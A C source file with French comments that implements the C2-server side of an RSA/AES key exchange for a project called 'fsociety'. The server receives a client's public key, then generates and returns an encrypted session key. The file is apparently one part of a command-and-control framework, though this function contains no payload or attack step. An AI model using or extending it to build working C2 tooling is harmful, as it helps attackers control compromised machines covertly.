#include "handshake.h"
#include "protocol.h"
#include "crypto_common.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
 * fsociety — Échange de clé (côté C2)
 * ============================================================ */

int fso_handshake(fso_server_t *srv, int client_idx,
                  uint8_t *aes_key_out)
{
    if (!srv || !aes_key_out) return -1;

    /* 1. Lire exactement l'en-tête. */
    uint8_t hdr_buf[FSO_HEADER_SIZE];
    if (fso_server_recv_exact(srv, client_idx, hdr_buf, FSO_HEADER_SIZE)
            != (ssize_t)FSO_HEADER_SIZE) {
        fprintf(stderr, "[-] Réception en-tête MSG_KEYX échouée\n");
        return -1;
    }

    /* 2. Parser l'en-tête. */
    fso_header_t header;
    if (fso_unpack_header(hdr_buf, FSO_HEADER_SIZE, &header) != 0) {
        fprintf(stderr, "[-] fso_unpack_header échoué\n");
        return -1;
    }

    if (header.type != MSG_KEYX) {
        fprintf(stderr, "[-] Type inattendu : 0x%02X\n", header.type);
        return -1;
    }
    if (header.length > 1024) {
        fprintf(stderr, "[-] MSG_KEYX trop grand\n");
        return -1;
    }

    printf("[*] MSG_KEYX reçu (%u octets DER)\n", header.length);

    /* 3. Lire exactement la clé publique RSA. */
    uint8_t pubkey[1024];
    if (fso_server_recv_exact(srv, client_idx, pubkey, header.length)
            != (ssize_t)header.length) {
        fprintf(stderr, "[-] Réception clé publique échouée\n");
        return -1;
    }

    /* 4. Générer la clé AES. */
    uint8_t aes_key[FSO_KEY_SIZE];
    if (fso_aes_generate_key(aes_key) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Génération clé AES échouée\n");
        return -1;
    }

    /* 5. Chiffrer la clé AES avec la clé publique RSA. */
    uint8_t encrypted[512];
    size_t enc_len = sizeof(encrypted);
    if (fso_rsa_encrypt(pubkey, header.length,
                        aes_key, FSO_KEY_SIZE,
                        encrypted, &enc_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Chiffrement RSA échoué\n");
        return -1;
    }

    printf("[+] Clé AES chiffrée (%zu octets)\n", enc_len);

    /* 6. Pack et envoi MSG_AUTH. */
    uint8_t packet[1024];
    int packet_len = fso_pack(MSG_AUTH, 0,
                              encrypted, (uint32_t)enc_len,
                              packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "[-] fso_pack échoué\n");
        return -1;
    }

    if (fso_server_send(srv, client_idx, packet, (size_t)packet_len) < 0) {
        fprintf(stderr, "[-] Envoi MSG_AUTH échoué\n");
        return -1;
    }

    printf("[+] MSG_AUTH envoyé (%d octets)\n", packet_len);

    memcpy(aes_key_out, aes_key, FSO_KEY_SIZE);
    return 0;
}